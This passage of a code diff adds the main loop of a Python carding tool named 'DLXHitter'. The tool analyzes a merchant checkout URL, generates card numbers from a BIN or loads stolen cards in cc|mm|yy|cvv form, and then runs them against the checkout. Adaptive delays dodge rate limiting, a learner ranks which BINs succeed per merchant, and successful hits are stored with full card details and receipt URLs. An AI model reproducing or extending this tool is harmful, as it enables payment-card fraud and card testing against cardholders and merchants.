+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            self.url_info = loop.run_until_complete(URLAnalyzer.deep_analyze_with_playwright(self.url))
+            loop.close()
+            if self.url_info['success']:
+                self.url_info['url'] = self.url
+                print_url_info(self.url_info)
+            else:
+                print(f"{Colors.RED}[!] Deep analysis failed: {self.url_info.get('error', 'Unknown')}{Colors.END}")
+                self.url_info = {'url': self.url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
+        else:
+            self.url_info = {'url': self.url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
+
+    def get_cards_or_bins(self):
+        print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
+        print(f"{Colors.BOLD}{'📌 STEP 2: SELECT CARD SOURCE'.center(50)}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*50}{Colors.END}")
+        print(f"{Colors.GREEN}[1]{Colors.END} Generate cards from BIN")
+        print(f"{Colors.GREEN}[2]{Colors.END} Load existing cards")
+
+        choice = input(f"{Colors.WHITE}Choice (1/2): {Colors.END}").strip()
+
+        if choice == '1':
+            bin_input = input(f"{Colors.WHITE}🔢 BIN: {Colors.END}").strip()
+            count = min(int(input(f"{Colors.WHITE}🎴 How many cards? (1-{MAX_ATTEMPTS}): {Colors.END}").strip()), MAX_ATTEMPTS)
+            self.cards = CardGenerator.generate_cards(bin_input, count)
+            print(f"{Colors.GREEN}[✓] {len(self.cards)} cards generated{Colors.END}")
+        else:
+            print(f"\n{Colors.YELLOW}[!] Enter cards (cc|mm|yy|cvv) one per line, empty line to finish{Colors.END}")
+            while True:
+                line = input(f"{Colors.WHITE}💳 Card {len(self.cards)+1}: {Colors.END}").strip()
+                if not line:
+                    break
+                card = CardGenerator.parse_card_string(line)
+                if card:
+                    self.cards.append(card)
+                else:
+                    print(f"{Colors.RED}[!] Invalid format! Use: 4242424242424242|12|26|123{Colors.END}")
+            print(f"{Colors.GREEN}[✓] {len(self.cards)} cards loaded{Colors.END}")
+
+    def run(self):
+        print_banner()
+        init_db()
+
+        self.get_url_and_analyze()
+        self.get_cards_or_bins()
+
+        if not self.cards:
+            print(f"{Colors.RED}[!] No cards loaded! Exiting...{Colors.END}")
+            return
+
+        suggested = self.pattern_learner.suggest_best_pattern(self.url_info['merchant'])
+        if suggested:
+            print(f"\n{Colors.CYAN}[🧠 AI SUGGESTION]{Colors.END} Best BIN: {Colors.GREEN}{suggested}{Colors.END}")
+
+        print_header()
+        start_time = time.time()
+
+        async def run_hits():
+            for i, card in enumerate(self.cards[:MAX_ATTEMPTS]):
+                if i > 0:
+                    last_result = 'declined'
+                    if self.engine.results and self.engine.results[-1].get('success'):
+                        last_result = 'success'
+                    delay = self.rate_limiter.calculate_delay(last_result)
+                    await asyncio.sleep(delay)
+
+                result = await self.engine.hit(
+                    self.url, card,
+                    self.url_info['merchant'],
+                    self.url_info.get('product', 'Unknown'),
+                    self.url_info.get('amount', 'Unknown'),
+                    i + 1
+                )
+
+                if result.get('success'):
+                    print_success(result['card'], self.url_info['merchant'],
+                                  self.url_info.get('product', 'Unknown'),
+                                  self.url_info.get('amount', 'Unknown'),
+                                  result.get('receipt_url', 'N/A'),
+                                  result['response_time'])
+                    self.pattern_learner.learn(result['card'], self.url_info['merchant'], True)
+                else:
+                    print_decline(result['card'], result.get('decline_code', 'error'),
+                                  result['response_time'], result['attempt'])
+                    self.pattern_learner.learn(result['card'], self.url_info['merchant'], False)
+
+                print_progress(i + 1, min(len(self.cards), MAX_ATTEMPTS),
+                               self.engine.successes, self.engine.fails)
+
+        asyncio.run(run_hits())
+
+        total_time = time.time() - start_time
+        print_final_stats(self.engine.successes, self.engine.fails, total_time, self.url_info)
+
+        conn = sqlite3.connect(DATABASE)
+        c = conn.cursor()
+        for result in self.engine.results:
+            c.execute("""INSERT INTO hits (timestamp, card, merchant, product, amount, success, decline_code, receipt_url, response_time)
+                        VALUES (?,?,?,?,?,?,?,?,?)""",
+                      (datetime.now().isoformat(),
+                       f"{result['card']['card']}|{result['card']['month']}|{result['card']['year']}|{result['card']['cvv']}",
+                       self.url_info['merchant'],
+                       self.url_info.get('product', 'Unknown'),
+                       self.url_info.get('amount', 'Unknown'),
+                       1 if result.get('success') else 0,
+                       result.get('decline_code', ''),
+                       result.get('receipt_url', ''),
+                       result.get('response_time', 0)))
+        conn.commit()
+        conn.close()
+        print(f"{Colors.GREEN}[✓] Results saved to database{Colors.END}")
+
+
+def main():
+    try:
+        app = DLXHitter()
+        app.run()
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.YELLOW}[!] Process interrupted by user{Colors.END}")
+    except Exception as e:
+        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
+        import traceback
+        traceback.print_exc()
+
+
+if __name__ == "__main__":
+    main()
